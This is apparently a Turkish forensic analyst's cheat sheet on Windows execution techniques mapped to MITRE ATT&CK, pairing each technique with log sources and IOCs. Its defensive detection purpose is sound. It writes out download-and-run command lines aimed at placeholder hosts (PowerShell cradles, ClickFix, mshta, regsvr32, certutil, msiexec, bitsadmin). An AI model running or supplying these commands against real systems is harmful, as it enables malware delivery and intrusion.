

## PowerShell — T1059.001

Memory'de çalışabilir,.NET framework'e tam erişimi var, 
obfuscation desteği var.

**Yaygın kullanım şekilleri:**
- Download cradle: `IEX (New-Object Net.WebClient).DownloadString('http://...')`
- Encoded command: `powershell -enc [base64]`
- Bypass execution policy: `powershell -ep bypass`
- Hidden window: `powershell -w hidden`
- Reflective loading: memory'e DLL veya EXE yükle, diske yazma
- AMSI bypass: güvenlik katmanını devre dışı bırakma

**Nereye bakarsın:**
- PowerShell Operational 4104 — Script Block Logging
  Deobfuscated içeriği yakalar, en değerli kaynak
- PowerShell Operational 4103 — Module Logging
- Windows PowerShell.evtx 400/600 — engine start/stop
- Security 4688 — powershell.exe komut satırı argümanları
  (Process Command Line audit açıksa)
- Sysmon ID 1 — process oluşturma, komut satırı tam görünür
- PSReadline history:`AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- Prefetch — powershell.exe çalışma zamanları

**IOC:**
- `-enc` veya `-EncodedCommand` parametresi
- `-w hidden` veya `-WindowStyle Hidden`
- `-ep bypass` veya `-ExecutionPolicy Bypass`
- `IEX`, `Invoke-Expression`, `DownloadString`, `DownloadFile`
- Base64 string içinde `http://` veya IP adresi
- Parent process beklenmedik: word.exe → powershell.exe
- `[System.Reflection.Assembly]::Load` — reflective loading

**Dikkat:**
- 4104 (Script Block Logging) varsayılan açık değildir, GPO ile etkinleştirilmeli.
- AMSI bypass denenmiş olabilir — 4104 logları eksik veya kesilebilir.

---

## CMD- Windows Command Shell — T1059.003

Özellikle lateral movement araçları cmd kullanır.

**Yaygın kullanım şekilleri:**
- Komut zinciri: `cmd /c whoami && net user && ipconfig`
- Çıktı yönlendirme: `cmd /c command > \\127.0.0.1\ADMIN$\output.txt`
- Gizli: `cmd /c start /b /min command`
- Bypass: `c:\windows\system32\cmd.exe` tam path ile çalıştırma

**Nereye bakarsın:**
- Security 4688 — cmd.exe ve komut satırı argümanları
- Sysmon ID 1 — parent process + komut satırı
- Prefetch — cmd.exe çalışma sıklığı ve zamanları
- Impacket araçlarında tipik pattern:
  `cmd.exe /Q /c command 1> \\127.0.0.1\ADMIN$\__xxx 2>&1`
- Parent process ve komut satırı içeriğine odaklan,

**IOC:**
- `/Q` (echo kapalı) + `/c` kombninasyonu şüpheli
- Çıktı ADMIN$ veya IPC$ share'ine yönlendiriliyor
- cmd.exe'nin parent'ı beklenmedik: excel.exe, winword.exe
- Net komutları zinciri: `net user`, `net localgroup`, `net view`



---

## MSHTA — T1218.005

- mshta.exe: Microsoft HTML Application Host.
- ClickFix/fakeCAPTCHA kampanyalarıyla birlikte yeniden yükselişe geçti.
- Meşru imzalı Windows binary, AV'yi bypass eder.

**Yaygın kullanım şekilleri:**
- Uzak HTA çalıştırma: `mshta.exe http://evil.com/payload.hta`
- Inline VBScript: `mshta.exe vbscript:Execute("...")`
- Dosyadan: `mshta.exe C:\Users\...\payload.hta`
- JavaScript ile: HTA içinde JScript veya VBScript

**Nereye bakarsın:**
- Prefetch — mshta.exe var mı?
- Security 4688 / Sysmon ID 1 — mshta.exe komut satırı argümanı
- Sysmon ID 3 — mshta.exe'nin ağ bağlantısı (uzak HTA indirme)
- Sysmon ID 11 — mshta.exe'nin Temp'e dosya yazdığı
- Parent process: mshta.exe'nin child'ı powershell.exe veya cmd.exe

**Dikkat:**
mshta.exe meşru kullanım senaryosu neredeyse yok.
Görüldüğünde şüpheli kabul et, yanlış pozitif oranı çok düşük.

---

## LOLBIN Abuse — T1218 (Signed Binary Proxy Execution)

Living-Off-the-Land Binaries: Windows'un kendi imzalı araçlarını
zararlı amaçla kullanma. AV bypass için ideal çünkü binary meşru.

**En yaygın LOLBINler ve kullanımları:**

**rundll32.exe — T1218.011**


rundll32.exe javascript:"..\mshtml,RunHTMLApplication"
rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe
rundll32.exe zararlı.dll,EntryPoint
Bak: Sysmon ID 1 (komut satırı), Sysmon ID 7 (yüklenen DLL)

**regsvr32.exe — T1218.010** (Squiblydoo)

regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
Bak: Sysmon ID 1, ağ bağlantısı (Sysmon ID 3)

**certutil.exe — T1140**
certutil -urlcache -split -f http://evil.com/payload.exe out.exe
certutil -decode encoded.b64 decoded.exe
Bak: 4688 (`-urlcache` parametresi), Sysmon ID 3 (ağ bağlantısı)

**msiexec.exe — T1218.007**
msiexec /q /i http://evil.com/payload.msi
Bak: Application.evtx MsiInstaller, Sysmon ID 1

**wscript.exe / cscript.exe — T1059.005/007**
wscript.exe //e:jscript payload.txt
cscript.exe zararlı.vbs
Bak: 4688, Sysmon ID 1, parent process

**bitsadmin.exe / BITS — T1197**
bitsadmin /transfer job http://evil.com/payload.exe C:\temp\p.exe
Bak: BITS-Client/Operational log, qmgr*.dat

---

## WMI Execution — T1047

Windows Management Instrumentation. Güçlü, fileless,
ve birçok ortamda log bırakmaz. Lateral movement ile birlikte sık kullanılır.

**Yaygın kullanım şekilleri:**
- Komut çalıştırma: `wmic process call create "cmd.exe /c ..."`
- PowerShell üzerinden: `Invoke-WmiMethod -Class Win32_Process`
- Uzaktan: `wmic /node:TARGET process call create "..."`
- impacket wmiexec.py — uzaktan execution

**Nereye bakarsın:**
- WMI-Activity/Operational 5857 — WMI aktivitesi
- WMI-Activity/Operational 5858 — WMI sorgu hatası (deneme yanılma)
- WMI-Activity/Operational 5859/5861 — event subscription
- Sysmon ID 20/21/22 — WMI event (filter/consumer/binding)
- Security 4688 — WMI'dan spawn olan process
  Parent: `WmiPrvSE.exe` → child process şüpheli
- Prefetch — WMI execution sonrası çalışan araçlar

**IOC:**
- `WmiPrvSE.exe` veya `wmiprvse.exe` → cmd.exe / powershell.exe child
- wmic process call create + obfuscated komut
- WMI-Activity log'da bilinmeyen namespace sorgusu
- Uzaktan WMI: kaynak IP + hedef sistem

**Dikkat:**
WMI execution fileless olabilir — Prefetch bırakmayabilir.
WMI-Activity log varsayılan açık olmayabilir, ayarlanması gerekir.
`WmiPrvSE.exe` parent'lı process'ler her zaman incelenmeli.

---

## Scheduled Task Execution — T1053.005

Persistence için değil, direkt execution için de kullanılır.
Özellikle yetkili hesapla task oluşturup hemen çalıştırma.
impacket atexec.py bu yöntemi kullanır.

**Nereye bakarsın:**
- Security 4698 — task oluşturuldu
- Security 4702 — task güncellendi
- TaskScheduler/Operational 106 — task registered
- TaskScheduler/Operational 200/201 — task started/completed
- `C:\Windows\System32\Tasks\` — task XML, içindeki Action bölümü
- Sysmon ID 1 — taskeng.exe veya svchost.exe → child process

**IOC:**
- Task name meşru Windows task'lerine benzetilmiş
- Task Action kısmında: powershell, cmd, mshta, veya unknown binary
- Task oluşturulur → hemen çalışır → silinir (4698 → 200 → 4699 zinciri)
- SYSTEM veya yüksek yetkiyle çalışan beklenmedik task

**Dikkat:**
Task silinmiş olsa bile Security 4699 log'u kalır.
TaskScheduler log temizlendiyse $UsnJrnl'de
`C:\Windows\System32\Tasks\` altındaki değişimlere bak.

---

## User Execution — T1204

Kullanıcının kendisinin zararlı dosyayı veya kodu çalıştırması.
ClickFix/fakeCAPTCHA

**Alt teknikler:**

**T1204.001 — Malicious Link**
Kullanıcı linke tıklıyor, drive-by download veya credential phishing.

**T1204.002 — Malicious File**
Kullanıcı zararlı eki açıyor: .lnk, .one, .iso, .exe

**T1204.004 — Malicious Copy and Paste (ClickFix/fakeCAPTCHA)**
Sahte hata/CAPTCHA → kullanıcıya Win+R veya Run kutusu açtırılır
→ Ctrl+V ile kopyalanmış zararlı komut yapıştırılır → Enter.
Kullanıcı kendi elimle çalıştırıyor, AV bypass garantili.

**ClickFix örnek komut:**
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"


**IOC:**
- `explorer.exe` → `powershell.exe` / `cmd.exe` doğrudan spawn
  (Run dialog kullanımının tipik iz'i)
- PSReadline history'de obfuscated veya encoded komut
- Komut çalıştırma zamanı ile browser ziyareti zamanı örtüşüyor

**Dikkat:**
ClickFix'te kullanıcı kendisi çalıştırdığı için
EDR ve sandbox genellikle yakalamıyor.
